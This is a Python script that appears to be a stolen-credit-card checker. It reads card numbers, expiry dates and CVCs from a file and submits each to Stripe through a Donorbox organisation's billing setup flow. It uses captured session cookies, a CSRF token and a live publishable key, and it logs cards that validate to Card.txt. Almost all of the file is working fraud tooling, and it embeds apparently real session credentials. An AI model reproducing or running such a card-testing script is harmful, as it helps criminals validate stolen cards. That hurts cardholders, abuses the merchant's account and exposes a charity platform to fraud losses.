import requests

ss = requests.Session()    
from colorama import Fore


import requests

ss = requests.Session()


def starting():

 print(Fore.RED+"__________________________________\n"+Fore.RESET)
 print(Fore.YELLOW+"(1) Import From File:> "+Fore.RESET)
 print(Fore.YELLOW+"(2) Single Card Checker:> "+Fore.RESET)
 print(Fore.RED+"__________________________________"+Fore.RESET)
 user_value = int(input("Enter Input: "))
 full_seti,pk_key,half_seti  = sk_pk()

 if user_value ==1:
   with open('allcc.txt', 'r') as file:
    for line in file:
        user_input  = line.strip()  # remove trailing newline character
        print(user_input)
        stripe(full_seti,pk_key,half_seti,user_input)
 else:
  user_input = input('Enter Card  : ')
  stripe(full_seti,pk_key,half_seti,user_input)       


def sk_pk():

    data = {
        "stripe_js_id": "337556ef-ea18-41e 1-9ce6-51a704978d29",
        "referrer_host": "donorbox.org",
        "key": "pk_live_1TiySUjG2VvU27ZhnX775lWtq4Gq45tuRo3f47l3fel2t9TuG0hHT2dc9IuyITSCdm8scWA6aQ50qIPoPZ8DZuMns009QRfWOPT",
        "request_surface": "web_card_element_popup",
        "auth_session_client_secret": "ascs_COoBEjxjYXNhc183MFg5ank0LWRNYyE0amFWdDFWeXJhcHNyb2ZQOGFVMW5xcSE0MmhlTTJvI0dnVUk2Z0VZQVEaJGFhNDI1YTY4LTYxNDMtNDAwMy1iZTQ5LTE4ZGE4OTdkN2M1ZSIIQWJCWlFibHY"
    }


    header_dict = {
        "Accept": "application/json",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "Content-Length": "411",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "private_machine_identifier=BguCUi1KttS92t%2FtAQrLK2VcU0bDNDJry3uKwW9PBerfZDk0BVbVeN5ShmPJM43CUkY%3D; __Host-LinkSession=ascs_COoBEjxjYXNhc183MFg5ank0LWRNYyE0amFWdDFWeXJhcHNyb2ZQOGFVMW5xcSE0MmhlTTJvI0dnVUk2Z0VZQVEaJGFhNDI1YTY4LTYxNDMtNDAwMy1iZTQ5LTE4ZGE4OTdkN2M1ZSIIQWJCWlFibHY; __Host-LinkSessionPresent=true",
        "Origin": "https://js.stripe.com",
        "Pragma": "no-cache",
        "Priority": "u=1, i",
        "Referer": "https://js.stripe.com/",
        "Sec-Ch-Ua": "\"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": "\"Android\"",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36"
    }
    res = ss.post('https://merchant-ui-api.stripe.com/elements/wallet-config',data=data,headers=header_dict)
    json_info = res.json()
    pk_key = json_info['consumer_info']['publishable_key']
    print(pk_key)
    print("LOADING.....\n")

    # SETI

    headers = {
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "Content-Length": "0",
        "Origin": "https://donorbox.org",
        "Pragma": "no-cache",
        "Priority": "u=1, i",
        "Referer": "https://donorbox.org/org_admin/my_plan?pro_tier_popup=true",
        "Sec-Ch-Ua": "\"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": "\"Android\"",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
        "X-Csrf-Token": "nrc2dnbjOtFOodF4UIi4oM83BX7taNiAt1KEY2jRdKV8nEqtsAiGHU_7xGqAiVQzpDrjV9XP_AW2nMQu_IaCAw",
        "X-Requested-With": "XMLHttpRequest",
        'Cookie':'_gcl_au=1.1.1786579619.1727513072; _ga=GA1.1.97654234.1727513072; _fbp=fb.1.1727513080270.205575200712905986; prism_252270099=3149f077-4cb2-43cc-8114-cc12c774c7a6; _gd_visitor=1b19b6f6-2e72-4ca5-8d3d-16cc3d514a0c; hubspotutk=899f6f38753020873978527711f6a9a4; _gd_svisitor=d2752c31146f300029f1f964bd010000a5811500; db_exit_intent_close=true; _hjSessionUser_2096856=eyJpZCI6IjFlZTc4NGM2LWM0M2ItNTgxZS1iYmNmLTBjMDU5MjBjZmEzYyIsImNyZWF0ZWQiOjE3Mjc1MTMwNzM2NjksImV4aXN0aW5nIjp0cnVlfQ==; __stripe_mid=c3215a8d-5e05-4427-8524-2df186d8a0537e96c0; __hstc=254822423.899f6f38753020873978527711f6a9a4.1727513086307.1727513086307.1727540664043.2; first_session=%7B%22visits%22%3A5%2C%22start%22%3A1727513072416%2C%22last_visit%22%3A1727706517896%2C%22url%22%3A%22https%3A%2F%2Fdonorbox.org%2F%22%2C%22path%22%3A%22%2F%22%2C%22referrer%22%3A%22%22%2C%22referrer_info%22%3A%7B%22host%22%3A%22donorbox.org%22%2C%22path%22%3A%22%2F%22%2C%22protocol%22%3A%22https%3A%22%2C%22port%22%3A80%2C%22search%22%3A%22%22%2C%22query%22%3A%7B%7D%7D%2C%22search%22%3A%7B%22engine%22%3Anull%2C%22query%22%3Anull%7D%2C%22version%22%3A0.4%7D; _hjSession_2096856=eyJpZCI6Ijk1ZTMzM2M2LTYzYTUtNGQ2Mi1iNmI0LWM1NzNhMThhNWE4MyIsImMiOjE3Mjc3MDY1MTc5OTgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; _hp2_ses_props.469141484=%7B%22ts%22%3A1727706517076%2C%22d%22%3A%22donorbox.org%22%2C%22h%22%3A%22%2F%22%7D; _gd_session=5d39fad9-9e82-48b8-8bc4-6c5d48be1020; cookie_consent={"necessary":true,"preferences":true,"statistics":true,"marketing":true,"version":"1.0"}; _hjHasCachedUserAttributes=true; __stripe_sid=3ed89837-012f-429d-a5c0-6070e5b61af6c50311; last_session_org_id=832254; _uetsid=851d37607f3811efb0c52702522f84db; _uetvid=09da05107d7611efa217c7a150f7f1b7; org_user_credentials=9f084fa11d83f405caa1e32b95e0a4500af03b8fe68a583145deccf8843750e002525dd584caffdde493d460c90db4d347d5cfcc275394bce7fb8639e236dd0f%3A%3A784416; weak_password=false; oustc=68TnRr23va3Yu%2Bu3GgU2I2zVKWrtBOPmoQKvGtuqhMm05Q69j7OWgYpGqytTEYXlhT93B6LMJBvWP0K83jvMnbKkflhbnqRQKh1NVg5Ewi6s6CVmcQTtd1FaLTt%2BAkM%3D--aJ9BuqhWtd0LRYU8--AdyoqXy0Kft59DxhAM7yHA%3D%3D; tap_conversion_832254=true; _hp2_id.469141484=%7B%22userId%22%3A%223942890674864546%22%2C%22pageviewId%22%3A%224439343575388168%22%2C%22sessionId%22%3A%221357829029388782%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; cf_clearance=0PAExyO4EoRXsWtvtgfopv9klSw_tOHFFlSmEYdeFLE-1727707476-1.2.1.1-Pg9ZVR0ri9RrwY49ZlYk.4vfCAbh4wDB.1TgG6DalKBRlUnmvC6QBP_0CrYE0owLIj6RFzXW0X1PjvqQjL3cE0yi_Gq8A.9Z31AyEMioKr_G8uDJAHjM3sKi3tLoslLeqq31jZWSh_ezDkAmXuqSWakKK0EGeSHGvP3PogDbf9xPbGSKV2pMwrar7XK2OcHHhOA6XM0vmlMpatOzmOtRLr3eCuMhxSK9qIG4Hv.Oyz9SLKpAC9.32tvdX2E.t.EfwYARgcxUaqKSbHdRYTa6YBX77mM4R6TQTO3oulYJjqCq83YlRszahcel1vC7XBOw.nivWILacUZLc38GzWggSWyUE3DjTjSoapJ9CO718sfrVdJpw3JDcdgOVNZSKdPiN8kv6IbnCsGBAGyB5Qk4Sg; _donations_session=ECL0pUEt83G%2BxnlN%2Fb421fOZcQK%2FkEITVIYI1F2r1UGYBuJEg3faF9Kttxw%2FZsIHZ0VaPMvwlsrbRrPGyrQdK%2FFLfe%2FlrbJASTYjqUSuU9WpWxS3Wnv79YJoZ1U3naDSkCztj7fA7dql1AVrw1yCZTnN4lLs7QYmWuKRw%2FW5LgQ56yo74MOT6ycP4paJNmBd1ON4rggjgdHqXsxGf%2FvWka5teS4C%2B7QoSXDwZWbSPqIVKOyGrfHIR64vdxSgGbrmJ4WyG6LQoo%2F9RkLg9M%2FoHvyMm4CqzOzJiJmsvl%2Fidc5OweWetp4vKuo5d8SD0VoLnxMutTW7b9WRvfWR%2B5SEr%2FP3qHGLN35%2B22mzlT%2FodkSYThpv2ppaPeeiVyv%2FzD8%2FIPR7gB7P6FQmB82aC%2FCr7gSAbPLD80dpOa3jEXxMGGZhUG7BgkHHXLHPi2UVQPSKRH%2BEt6EfuOzb6WhgRLr%2FhPRKcbc35kfW6X8%2Fjsv0uQvG8dWJ07VE7qyIYe8Pf%2Bbp33Y1WxZb%2FcsHD28fzJ%2FiSZHElyZr8%2FIA9JeDcses7I%2BVSYprNkJnlkvV2oQAERTQ2lMfseOQP1P2iUYR%2B7Bf4y68OpRM36T4BJH1%2BxqHqxys%2BWsXCUy8lzFiDsvq9Vs5gxBBYYyG--%2BDZCvtMC%2FXJN7%2BvN--x5KrG2zgoexWL6yJC9m66Q%3D%3D; ph_phc_7yM8tigCzNdoiXaIfuz3Pn4RdMJFnE2zTEErPwmgA6o_posthog=%7B%22distinct_id%22%3A%22ousr_858a3408dca93529ba64440d32889f0820f14abf%22%2C%22%24sesid%22%3A%5B1727707490886%2C%2201924356-bd10-7ab4-8f86-f517b70b4f9c%22%2C1727706610960%5D%2C%22%24epp%22%3Atrue%7D; _ga_H43BHHEK3F=GS1.1.1727706517.6.1.1727707491.40.1.1029724600'
    }

    res = ss.post('https://donorbox.org/org_admin/billing_card/setup_intent',headers=headers)

    full_seti = res.text
    half_seti = full_seti.split('_')[0] + '_' + full_seti.split('_')[1]
    print(full_seti)
    print(half_seti)
    print("LOADING.....\n")

    return full_seti,pk_key,half_seti






################ MAIN WORKING OF CODE STARTS FROM HERE  #############


def stripe(full_seti,pk_key,half_seti,cc):

    user_input = cc
    ccn, mm, yy, cvc = user_input.split('|')
    print(ccn)
    print(mm)


    headers = {
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Content-Length': '15145',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://newassets.hcaptcha.com',
        'Authorization': f'Bearer pk_live_1TiySUjG2VvU27ZhnX775lWtq4Gq45tuRo3f47l3fel2t9TuG0hHT2dc9IuyITSCdm8scWA6aQ50qIPoPZ8DZuMns009QRfWOPT',
        'Pragma': 'no-cache',
        'Priority': 'u=1, i',
        'Referer': 'https://newassets.hcaptcha.com/',
        'Sec-CH-UA': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'Sec-CH-UA-Mobile': '?1',
        'Sec-CH-UA-Platform': 'Android',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36'
    }
    
    data  = {
        "payment_method_data[type]": "card",
        "payment_method_data[card][number]": ccn ,
        "payment_method_data[card][cvc]": cvc,
        "payment_method_data[card][exp_month]": mm,
        "payment_method_data[card][exp_year]": yy,
        "payment_method_data[guid]": "3abb39ad-3346-4b2a-80e3-2f757a76bf742d001d",
        "payment_method_data[muid]": "c3215a8d-5e05-4427-8524-2df186d8a0537e96c0",
        "payment_method_data[sid]": "e9084de6-3158-4d28-883d-3552a9fe1577eea5e1",
        "payment_method_data[pasted_fields]": "number",
        "payment_method_data[payment_user_agent]": "stripe.js/fcb19dd0fc; stripe-js-v3/fcb19dd0fc; card-element",
        "payment_method_data[referrer]": "https://donorbox.org",
        "payment_method_data[time_on_page]": 947693,
        "expected_payment_method_type": "card",
        "use_stripe_sdk": True,
        "key": 'pk_live_1TiySUjG2VvU27ZhnX775lWtq4Gq45tuRo3f47l3fel2t9TuG0hHT2dc9IuyITSCdm8scWA6aQ50qIPoPZ8DZuMns009QRfWOPT' ,
        "client_secret": full_seti
    }

    res =ss.post(f'https://api.stripe.com/v1/setup_intents/{half_seti}/confirm',headers=headers,data =data)
    print("STEP 4")
    json_data = res.json()
    try:
        if json_data['error']['message'] == 'Your card number is incorrect.':
               print(Fore.RED+"Incorrect Card number Payment failed"+Fore.RESET) 
   
        elif json_data['error']['message'] == "Your card's expiration year is invalid.":
             print(Fore.RED+"Card Has been expired"+Fore.RESET) 

        elif json_data['error']['message'] == 'Your card was declined.':
             print(Fore.RED+"Insufficient Funds OR Suspected Fraud"+Fore.RESET) 

        elif json_data['error']['message'] == "Your card's security code is incorrect.":
             print(Fore.RED+"INCORRECT CVC"+Fore.RESET)
             print(Fore.GREEN+"CCN & MM|YY is Correct:)"+Fore.RESET)
             with open("Card.txt",'a') as f:
                   f.write("\nCCN & MM|YY is Correct BUT CVC WRONG\n")
                   f.write(cc)
                   f.write("\n")
        elif json_data['error']['message'] == "An error occurred while processing your card. Try again in a little bit.":
                 print(Fore.RED+"Network Error Check Your IP: "+Fore.RESET)
        else:
             print(res.text)

    except Exception as e:         
      if json_data["status"] == "succeeded":
        print(Fore.GREEN+"CARD IS VALID"+Fore.RESET)
        with open("Card.txt",'a') as f:
                   f.write("\n\nCARD IS VALID\n")
                   f.write(cc)
                   f.write("\n")
      else:
          print(res.text)
            
# "An error occurred while processing your card. Try again in a little bit."
#########################   CALLING THE FUNCTIONS

starting()



#full_seti,pk_key,half_seti  = sk_pk()

#stripe(full_seti,pk_key,half_seti)



